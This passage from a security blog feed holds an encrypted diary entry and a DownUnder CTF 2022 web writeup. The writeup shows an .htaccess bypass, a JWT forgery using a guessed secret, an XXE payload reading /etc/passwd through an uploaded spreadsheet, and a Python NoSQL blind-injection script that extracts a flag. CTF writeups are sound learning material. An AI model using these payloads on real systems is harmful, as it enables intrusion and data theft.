class="string">&quot;&quot;</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> evalSymlinksInScope(path, root)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web Security</category>
        <category>Cloud Security</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
      </tags>
  </entry>
  <entry>
    <title>Diary</title>
    <url>/2022/01/25/Diary/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="53f61cd5558649269d5d22634418c03fb75d35003169963e50b08a0085275cfa">866b8dd8da3390e86230366caa1004f73133dadcf86269f3a034cb8f0c775a6ace23dfe8cffbe2d19ab553c815ed16cb917dbccf04c6a0d8fcf711e570c7abb7e68aabd30a6c8e7fbc426ebb1c0432302e97234bafd16f6707063ba171c9c3ef7e4920e5fbfd9a9169dcddf21c4f0c5652ed47c1da0d62d90e2671eaa031c9faf6ce4a868604be38d46141c14f6d2e951e6879c69a6ef9df260673c522af9e864a31c651d539c3bd145847a077c17771b9775f67bb49c39af797a04bdf225a8703d9e7b71b3b55fc4ffa742bf71a7b830fbf7e0b6761f2801e265efc212586fcfeb75cb4854e4b4d1cfba80bfa5e3b7a05fb7ff632a7b666d96a09b41557303a84c6ca37fc550acc759341e39409cf21fabb28aede2d0f3a9019ff4d736b10f8a862e6020e07f6d7d87e4e4d29e2d57d48deecf819159fce02610613f50688ef3fde0df8460f8a1350ada34f791dff47734e2a35ca03e182150055aa54f60744f2f94e22e5e5a5189aec304a9db93aa542a1584b56e0e0f94e4090679d4870df59912b723e7bf6ab194827e04683e877842e9313e0109a63ae59cbc056ec0917d68a859a3e77f067f2e2a1844364a82d6444503eb4a139c2b9a16f1eef17eaad0d43d0f4296c6357779e3176d8b05e1df04755b7d1c3ea8dbcd7187334d24ccd3126103b67535011415b6190e2da9497420206eb511ede812147b34a92ef1e10046e8b8764785172d98c1217e6840cd508b81eb436d1124503197772462918e4bd9141fe33e9d1ae7924eea95dad3f72aaf322909ff1095632cd6c0d0f057e0b2c546e34f1e8571a7d5b4b96c367c94209de68adaf5948ca8ba61e7af8711e6bb75fcd523aa77a8179d833a8bae411606db8792603df5bdd6144f6abc62110c0c0541818eac1203110472449738066af4e8b83db91272571b9bbf8f52a9532469c021af99c5749f4a462f68a5fbb07cbefa0cddfff83f384e20680a3b7b6ee9951af3da7bbd6b8ed669f3b594d4ec77b2d14dde736749da4dd44a9e89e4d03aeb58bad2e34e940ea70b23a0348cd66d2da8241b07a722685804272453d97a46209652fdb3a1635433bc57edb4c89f1467b8e4dd2b08c29115da460f2af026f7a0a1d7bd1e865f9f00d303f72022af55f0f772469daf8af6acef4cf46eb060b95e5ca712e8a60e04b1baefcc38124c6033b3025454c392b52b4f421f43a3a269f07f2a067b860df56f1450c16cfad4ecc64d3df376424305a1f7665606672b3f4bfb20e96b5b754949de79b9156355bc4f514e03e6f55b53d7c5a32a295df220108e04c4e8b03d1935b2b79c606c91c14f01eb11463cbba9ccd5af19ee7b5a2c313b9c874052b4e2dac16e84462f15c49539bd172c2a6967f93c2735a2561fc0b0bd6e61efcd4188c4b35b228b237701258f2fbdfa102e3c07ae9d77dd114c10eee320ebf6bc9c3de9fb7869c74088ce5e66e3708e3b5990958664fd0d8a1cdd762d4c374d034a175af2cdb77f8e3b011660fc6aca74feaf9ffee6e8a04285cbf6ebd1b4b009f642998afe59d9411c9aeb37a68580b450bc4ee8692e6ceae0083232c3144f7a2e1a336532406c1486ffe1d0426a3d14f63d1c4ed28c6e2fcb594c3e59bdcc6677446bf17d033e6effa7bfcc754664d9d958744c13c1a471e8d53290e9863943511919ffe4a70814bfc9a83ae0bba7ce5e911d5218ba068fefe0fc85ff77e297b8262dca32f4e38c6bb2cc0ef4fd0f7d0991924e182560b26270e71c8cc753da822762fb7c0f71679ed00b45cab5d71becf7dbf08d0b58e5c651f20ed134362d2d0a1e4a22edb65c8a7fe139abd52ea2cc15666c94ef1f253387a4aeb7d9397d2c396d15a7bc453c83cdd1ab3b8372c1ae0605d65206c5b9a9f231fc464896458195b260cb079df03b334f6556d272b7f45392d3a0ad9ef14192967779ad6ed710dd78a9954f193661103966af4b7080db72075969052cd84fedf4a6feec7bce755477ba42a9ae5c278d4ac67a6d66a0ab8a890a78013f875ff00444f21e31b6521174cd930fd4b9dcdb6193621dbbae5735b2dab256e526b25339e5c57ba7407008d178770d5fce72edc2893ccd4b857a3029042214e724b965eb1800f07ad114d6984dc52e334346ad74bf2e551435de6f9d3660ace7235b15115e3d2838ae0982261210cec0eccb95f19b1e6c03cf699325ad8f8d73f211bb306a64f1c420f2549fc32f472ceb656065a38c2524470a4a28c3e0d46e26bbacc285799bc6736eb8d7d82767396061daccd7636da72fc352c17977268994489be3d28bbab52e82af94ddc6e1f11cdf649cca72ba213c1dc23be22105589016b58c512e1c694a36574db6dd898c66c9c533349d6829380a6c479ec7a73c58719003077b56bff2bb2746398bca4a6914bf6db9215205744914e92c61e5bd19166bb5b048264a5fe8fc0c1fff15bd81a8a86914e4ab923a591d02806c05f8171247d0592c457f423be7c5a1459da01e7a9c073669602acfcc1f87bbab8f8c4745596b56afd97ccdbdaee66337d0223b6499a024e2f729d032e8113076bcece35bb35982cad67a894afbec9b9d2905fe928b6c39f2e8a4a994d5b37bb095fc7ec94650581b47b503dacffafd1090b421e134fc928aa1eed59df8dcc3345464d0cb6eb632ef7671be494f0f5b042cc8c50e38663c55013f9b501575fa918c7af4b7fbf7bbb37171d279a2742ce7278a232abe46d111622516614a27176e588a145d17c1eaff72b20779e7d9fe13bc9fd55b9d82128d4377a0aadb2378961f39980f9f755ed0662aeeb30585eb0d5c6ec83b7f1d2bd1e63113cba40e62012ef3629fbb0b53ebf2d7060cef8ce6655d009a6a98599271f5c89739a9a99cbf9df2db899ae38f20f2ac1af7164a5360cf559a8bdc24c6ddec2eea970718a107e59e1e39c9bb323c09ce686cef7542a42d445ca0587d84e11b48104e3593c300da3c1a5f0d30f95735d7ecfa1b980027b8f7ed57a5b1f861f0cf9d69971c1c6486f5ac7762c94bc3cfa556c8c195a084b7ab5a0c8d71194a557b85401dc589377d4844a452dd5dfbfb0f257306c5f7b37ad3b12a7f78cef24f760e45ebe80b360422e4c4aac9b4e1807695f7ca385e5efbb8cf2038ccc602d8ec391c10b9217114b36aa95b39d0122ae0601581603a4d8fd653dc3f67951c7420b8e3d2d8e027a66c927e86672ad3e7670feb091aa22043c49e282fc4e79a33a9134a23569fec3e68ca4fd2f8eb67867ed76819c05fedeaf00a12b99ab607c14d5a008ab43a7237de0ab0e87b4df1d788f52d0687e3744b24fe5d125442ea251734ee595f7935175d2e7856ddbdfb0bcf74045d55e018b249dc6fa321c9505b831e27fd82632da51508fbd8064e75402a85e98c66a910ac7042bf47839401b16c83708bb83cf581880289d5fd0d2414b0f3b10607da3c30020a0b714c48de17f4a1413b264e0fc6df8c66378631fe78a133258f0472e604ac7398bf8ddd8f75d26b5552e926793fbcf8d788595c43906d2b196f4fdee1f8d2d5fae0896cf8325e95b8bb5371fab1fed7fafb28f697b3e73e7b7f477d07ea0c9245a1987b133391b0c15c36c05c774ff107755bf91d78fe6343e0b725e123cea772f2d3d18aa39a4761f4e212c9d71ac448dc30bd75aa470ec28ac6e601b027b39aadbd5d2fb6f2dcb938d540992a9c2a184cf74a3d301153d8f35bf7c5fb1e950b344b1632daaaadcfec31c18ebb428e870ab616fe73523c7b4667d8fbe58ea3f8803a610792ecc066c1b119a8906217a9d566481aa38962e2cc11a3b66987c95770db049651f188a8971fd4e0024cfc649f75356fc184b024e404cabdcdc81d845c00f00689c6080dfb4097554d29fa7d4139e802df374b1fdd8830a64d800f8ee53d98f1c4c89a94598d8b33f134b2812d23f5e1d41d7b8bc7010727a2f6f793934c20c99b26125385a06b105854ad646be1843daf6305f8063aa5dadd11f1f36750b91bc528a6243a90d5e58537c56f43bf26611feb4e4ae46e078afbd9c92146086fef2e182f5e2f93922ec3e5047037b3167f1cb4a1091a9de144f8fcfdfbda1f1635da60d3ebf9b1724b29a6adf048105de9e87c80b69a63b879707e89e5edad79f5a1a8d4af98bd49e9c7421c115d430c86d6ae73632ac8ed779d9b494326e09441bed9b5f2153247994b721f0fbbc83fc87fe9a25baba224b568cae35d68714f917eba2b5c518b33044d412d3e966226993b16e6591431be489124f3a50b6d27c26eb8dfa22564adb231faad47fd71ff71ac16278df47a49b9f3e09a94511059dc2bd6d2ed2fd1c7fac2ef579282b38451b0b83b41f16053fb9f09b7c96b67003217a13272f1c8b9d4533d3ff530c29aaf2d797f348e018abc1860f374b41dad3c909daa2c41e1447c0fd1be7c01619cc6cd6fcf4580791cc191aec09f89ca974bafb64745c871d001cb55aeb24618ffa58374ee30d73f87373545e7c7ccd1b1f0971d15cd8390b4c46a38ad9050436111d2bf9894d81e598d5e002c0afbc66121941e28d8e7ae1ad576d61a7eb873a1972d00c453d91c5530f9bf77433672bb6e53b43da3cc6926e455ff34a7274d8501071c797d6820417ec31174a7cb249d0bbc51423b1c227192743d75c32a2a63408142563d8f43848dab7f88a0867f661d764bace343a6db3308e02ceea9d083ea04b9b2d324df8ac88d88f58b6904fc29ebddb0d997d0a1585a948810551bdce2d26143f46bf16c55f62c9161be4bd2d22642cd28028f96dc8a4d73b3facfa31aaca33f12bacc0b8339928d73cd4a7a31a9e078ddc48fa304ecb4e0e1f6fce02a299cd8748fa9d930fe829b362d52ba74ab6129db558e7b9995592f7ade609f8baed2c0a014509783d2a088c61618e64e991d3ec1561e9e57906c72f2f45b13a4ea382f02a730f5ec1fbf94264a497d268786c5ad2c6e909986b2bb858444cf386c2665a0f2829875aba4f97753b959bae04877e478201b4745f9cf315e277b73cbbfe839415f1d0b9bedf93cafc54922b4678564f78fdea2ba99aa1baec5baa872909221386fdf99d7d89ae08ef0c267717c74e7e2853c53375afdb8d65d041b5e7c3c060ee02ba00c13505b183fea50d9e41d301b1e486396de015fb8a214da75a27dc3fe427a8f5ebcdd1d2c75d283f91bfdc77590cdfb889de2599d1b98c6d8bf7b211ae8f5d46d5976949f6e7a15c907b0a4af7e376fe8975c08aa1c1fc5e6007b41d8b1d1d250d4ac858fa43ab56e35fb560dac33f8ef889fc3da8153f67e67eb9d968754814c80088540a51694dfc3320b59a9ec29c9b7953f9899881420e3d61effbd84a239085a7069187d6aeb9e52dfe3ae1b789fa52e6b4a2097fdf75b6e0c1fddf465eb1ce995d0189355e34c1e033d3f838b16f32fe7c8319dc3b98b8134a374ce46e69dd854c7bea2d5b01ab0375596326f527bb395eb4e5a4461f9ca05ffa630ebfd18a5e0403ef2bef89c54e3f2b546e5810eadb20361b031cf6573725a447bb9bb62a47feb511055b69b769dbef681b091ebef0ab412211467fbf4d7cd477a597b2566cdd8c5c62194357d74e1ec1f8ea1d8a1781c07c4650dec2d36234ee4b004449621b296abcdb00d7f60586809e588476a13de5</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Diary</tag>
      </tags>
  </entry>
  <entry>
    <title>DownUnder CTF 2022 writeup</title>
    <url>/2022/09/26/DownUnder-CTF-2022-writeup/</url>
    <content><![CDATA[<h2 id="DownUnder-CTF-2022-writeup"><a href="#DownUnder-CTF-2022-writeup" class="headerlink" title="DownUnder CTF 2022 writeup"></a>DownUnder CTF 2022 writeup</h2><p>It was the second time I participated in CTF, this time I got 4 challenges solved. </p>
<span id="more"></span>

<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="helicoptering-htaccess-bypass"><a href="#helicoptering-htaccess-bypass" class="headerlink" title="helicoptering (.htaccess bypass)"></a>helicoptering (.htaccess bypass)</h4><p>This challenge is about bypassing the restrictions of <code>.htaccess</code> file.</p>
<p>The first <code>.htaccess</code> file：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;HTTP_HOST&#125; !^localhost$</span><br><span class="line">RewriteRule &quot;.*&quot; &quot;-&quot; [F]</span><br></pre></td></tr></table></figure>

<p><strong>Solution:</strong> Change the header <code>host</code> to <code>localhost</code></p>
<p>The second <code>.htaccess</code> file：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;THE_REQUEST&#125; flag</span><br><span class="line">RewriteRule &quot;.*&quot; &quot;-&quot; [F]</span><br></pre></td></tr></table></figure>

<p>Since <code>%&#123;THE_REQUEST&#125;</code> is getting the full HTTP Request Line, like <code>GET /two/flag.txt HTTP/1.1</code>, and it will check if the word <code>flag</code> is in there, we need to encode some charactors using <strong>ascii</strong> to bypass the restriction.</p>
<p><strong>Solution:</strong> Change the request <code>flag.txt</code> to <code>f%6clag.txt</code> (<code>%6c</code> is the ascii of <code>l</code>)</p>
<h4 id="Treasure-Hunt-JWT-key-guess"><a href="#Treasure-Hunt-JWT-key-guess" class="headerlink" title="Treasure Hunt( JWT key guess)"></a>Treasure Hunt( JWT key guess)</h4><p>This challenge asked us to find out the <code>treasure</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926113949.png"></p>
<p>On Register page, there’s a Treasures field, which means we would need to find out the <code>treasures</code> field for some account.</p>
<p>After registering an account, I got the JWT token.</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2NDE1NjU0NywianRpIjoiNTMxNDAzMzUtZTA5Yi00NDM3LTgzZjQtM2NkMjcyNTAyMDQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MzksIm5iZiI6MTY2NDE1NjU0NywiZXhwIjoxNjY0MTU3NDQ3fQ.Voo-9ZzfnKfLDoGrXSNHkIqzw2lJ9nKhI2VBvT_uOT0</span><br></pre></td></tr></table></figure>

<p>Using <code>jwo.io</code>:</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114349.png"></p>
<p>I spent a lot of time to crack this secret, but I found the secret was <code>onepiece</code> as it mentioned a lot here.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114520.png"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114603.png"></p>
<p>After copying the token, I used it to access the profile page again, it did not give any errors to me.</p>
<p>So, the secret is correct. Then I change the <code>sub</code> field to <code>1</code> to generate a new JWT token.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926114801.png"></p>
<h4 id="dyslexxec-XXE-attack"><a href="#dyslexxec-XXE-attack" class="headerlink" title="dyslexxec(XXE attack)"></a>dyslexxec(XXE attack)</h4><p>According to the name of the challenge, I could guess that it was a challenge related to XXE attack.</p>
<p>Go to upload page, and we can find that we can upload a <code>xlsm</code> file, as there was a <code>xlsm</code> file attached.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload/testPandasImplementation&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926115318.png"></p>
<p>Then I tried to upload this <code>xslm</code> file,<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926115546.png"></p>
<p>It was actually fetching file information from the <code>xlsm</code> file.</p>
<p>In <code>Dockerfile</code>: </p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;DUCTF&#123;test_flag&#125;:x:1001:1001::/tmp:/bin/false&#x27;</span> &gt;&gt; /etc/passwd</span></span><br></pre></td></tr></table></figure>

<p>So we need to get the flag from <code>/etc/passwd</code></p>
<p>In <code>app.py</code>, we could see the uploaded file would be unzipped, and a <code>WORKBOOK</code> file was extracted from it,.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">WORKBOOK = <span class="string">&quot;xl/workbook.xml&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractWorkbook</span>(<span class="params">filename, outfile=<span class="string">&quot;xml&quot;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> ZipFile(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> <span class="built_in">zip</span>:</span><br><span class="line">        <span class="built_in">zip</span>.extract(WORKBOOK, outfile)</span><br></pre></td></tr></table></figure>

<p>so I rename the file to <code>fizzbuzz.rar</code> and then unzipped it, then we could find the file <code>xl/workbook.xml</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">findInternalFilepath</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        prop = <span class="literal">None</span></span><br><span class="line">        parser = etree.XMLParser(load_dtd=<span class="literal">True</span>, resolve_entities=<span class="literal">True</span>)<span class="comment">#here&#x27;s the issue, it allows to resolve entities -&gt; XXE attack is allowed</span></span><br><span class="line">        tree = etree.parse(filename, parser=parser)</span><br><span class="line">        root = tree.getroot()</span><br><span class="line">        internalNode = root.find(<span class="string">&quot;.//&#123;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&#125;absPath&quot;</span>)<span class="comment">#here trying to find the parent node</span></span><br><span class="line">        <span class="keyword">if</span> internalNode != <span class="literal">None</span>:</span><br><span class="line">            prop = &#123;</span><br><span class="line">                <span class="string">&quot;Fieldname&quot;</span>:<span class="string">&quot;absPath&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Attribute&quot;</span>:internalNode.attrib[<span class="string">&quot;url&quot;</span>],</span><br><span class="line">                <span class="string">&quot;Value&quot;</span>:internalNode.text <span class="comment">#it&#x27;s trying to get value of the tag</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> prop</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;couldnt extract absPath&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>Edit the <code>workbook.xml</code>, add a system entity and put inside the <code>x15ac:absPath</code> tag.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;!- ..... --&gt;</span><br><span class="line">            &lt;mc:Choice Requires=&quot;x15&quot;&gt;</span><br><span class="line">                &lt;!-- &lt;x15ac:absPath url=&quot;/User/shared&quot; xmlns:x15ac=&quot;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&quot; /&gt; --&gt;</span><br><span class="line">                &lt;x15ac:absPath url=&quot;/User/shared&quot; xmlns:x15ac=&quot;http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac&quot; &gt;</span><br><span class="line">                    &amp;test;</span><br><span class="line">            &lt;/x15ac:absPath&gt;</span><br><span class="line">            &lt;/mc:Choice&gt;</span><br><span class="line">&lt;!- ..... --&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>Again, zip it, and change the suffix to <code>xlsm</code>.</p>
<p>You will see the flag after uploading it.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926120808.png"></p>
<h4 id="noteworthy-NoSQL-blind-SQL-injection"><a href="#noteworthy-NoSQL-blind-SQL-injection" class="headerlink" title="noteworthy(NoSQL blind SQL injection)"></a>noteworthy(NoSQL blind SQL injection)</h4><p>I thought this was a challenge related to prototype pollution :(</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> admin = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span> &#125;)</span><br><span class="line"><span class="keyword">if</span>(!admin) &#123;</span><br><span class="line">    admin = <span class="keyword">new</span> <span class="title class_">User</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span> &#125;)</span><br><span class="line">    <span class="keyword">await</span> admin.<span class="title function_">save</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> note = <span class="keyword">await</span> <span class="title class_">Note</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">noteId</span>: <span class="number">1337</span> &#125;)</span><br><span class="line"><span class="keyword">if</span>(!note) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FLAG</span> = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&#x27;DUCTF&#123;test_flag&#125;&#x27;</span></span><br><span class="line">    note = <span class="keyword">new</span> <span class="title class_">Note</span>(&#123; <span class="attr">owner</span>: admin.<span class="property">_id</span>, <span class="attr">noteId</span>: <span class="number">1337</span>, <span class="attr">contents</span>: <span class="variable constant_">FLAG</span> &#125;)</span><br><span class="line">    <span class="keyword">await</span> note.<span class="title function_">save</span>()</span><br><span class="line">    admin.<span class="property">notes</span>.<span class="title function_">push</span>(note)</span><br><span class="line">    <span class="keyword">await</span> admin.<span class="title function_">save</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Obviously, we need to get the content of Note(id 1337), but it would failed unless we got an <code>admin</code> permission.</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/edit&#x27;</span>, ensureAuthed, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> q = req.<span class="property">query</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;noteId&#x27;</span> <span class="keyword">in</span> q &amp;&amp; <span class="built_in">parseInt</span>(q.<span class="property">noteId</span>) != <span class="title class_">NaN</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;no problem with noteId&quot;</span>)</span><br><span class="line">            <span class="keyword">const</span> note = <span class="keyword">await</span> <span class="title class_">Note</span>.<span class="title function_">findOne</span>(q)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;no problem with finding Note&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!note) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Note does not exist!&#x27;</span> &#125;)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(note.<span class="property">owner</span>.<span class="title function_">toString</span>() != req.<span class="property">user</span>.<span class="property">userId</span>.<span class="title function_">toString</span>()) &#123;<span class="comment">//here it will check the owner</span></span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;You are not the owner of this note!&#x27;</span> &#125;)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;edit&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">noteId</span>: note.<span class="property">noteId</span>, <span class="attr">contents</span>: note.<span class="property">contents</span> &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Note Id has problem&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Invalid request&#x27;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this is from the exception&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">isLoggedIn</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Invalid request&#x27;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>At least <code>req.query</code> could be leveraged!!</p>
<p>We can set different content to brute force/guessing the content</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;noteId&quot;</span><span class="punctuation">:</span><span class="number">1337</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$gt&quot;</span><span class="punctuation">:</span>&#x27;a&#x27;</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>Here’s the solution. Of course, burpsuite intruder is another choice.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">charset = <span class="built_in">sorted</span>(printable)[<span class="number">6</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_user</span>(<span class="params">username, password</span>):</span><br><span class="line">    r = session.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/register&#x27;</span>, json=&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># returns True if the note exists</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">q</span>):</span><br><span class="line">    r = session.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/edit?noteId=1337&amp;contents[$gt]=<span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You are not the owner of this note!&#x27;</span> <span class="keyword">in</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://web-noteworthy-873b7c844f49.2022.ductf.dev&#x27;</span></span><br><span class="line">session = Session()</span><br><span class="line">register_user(<span class="string">f&#x27;solve-<span class="subst">&#123;randint(<span class="number">1</span>, <span class="number">10000</span>)&#125;</span>&#x27;</span>, <span class="string">&#x27;solve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>:] != <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    u = <span class="built_in">len</span>(charset)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = (l + u) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        candidate = flag + charset[m]</span><br><span class="line">        <span class="keyword">if</span> oracle(candidate):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> oracle(flag + charset[m + <span class="number">1</span>]):</span><br><span class="line">                <span class="keyword">if</span> charset[m + <span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    flag = flag + charset[m + <span class="number">1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flag = candidate</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            l = m - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u = m + <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220926131752.png"></p>
<h4 id="no-symlink-Symlink-and-file-permission-trick"><a href="#no-symlink-Symlink-and-file-permission-trick" class="headerlink" title="no-symlink(Symlink and file permission trick)"></a>no-symlink(Symlink and file permission trick)</h4><p>The website allows us to upload a tar file, and it will extract the file.</p>
